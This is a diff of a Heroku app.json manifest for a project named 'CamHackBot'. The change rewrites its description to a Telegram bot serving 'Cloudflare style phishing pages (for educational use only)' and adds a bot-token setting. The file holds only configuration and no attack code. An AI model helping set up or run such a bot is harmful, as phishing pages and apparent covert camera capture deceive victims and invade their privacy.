@@ -1,13 +1,16 @@
 {
-  "name": "CamHackBot WebView",
-  "description": "Heroku-ready project to demonstrate webview and cloudflare EJS rendering",
-  "repository": "https://github.com/bloodlinebots/camhackbot-heroku",
-  "logo": "https://nodejs.org/static/images/logo.svg",
-  "keywords": ["express", "ejs", "webview", "heroku"],
+  "name": "CamHackBot",
+  "description": "A Telegram bot with WebView & Cloudflare style phishing pages (for educational use only).",
+  "repository": "https://github.com/your-username/camhackbot-heroku",
+  "keywords": ["telegram", "bot", "webview", "heroku", "ejs", "express"],
   "env": {
-    "NODE_ENV": {
-      "description": "Set to production",
-      "value": "production"
+    "BOT_TOKEN": {
+      "description": "Enter your Telegram bot token here",
+      "required": true
+    },
+    "URL": {
+      "description": "Your deployed Heroku app URL (optional but recommended)",
+      "required": false
     }
   },
   "buildpacks": [
@@ -15,13 +18,7 @@
       "url": "heroku/nodejs"
     }
   ],
-  "formation": {
-    "web": {
-      "quantity": 1,
-      "size": "free"
-    }
-  },
   "scripts": {
-    "postdeploy": "echo 'Deployed Successfully'"
+    "postdeploy": "echo '✅ CamHackBot deployed successfully!'"
   }
 }
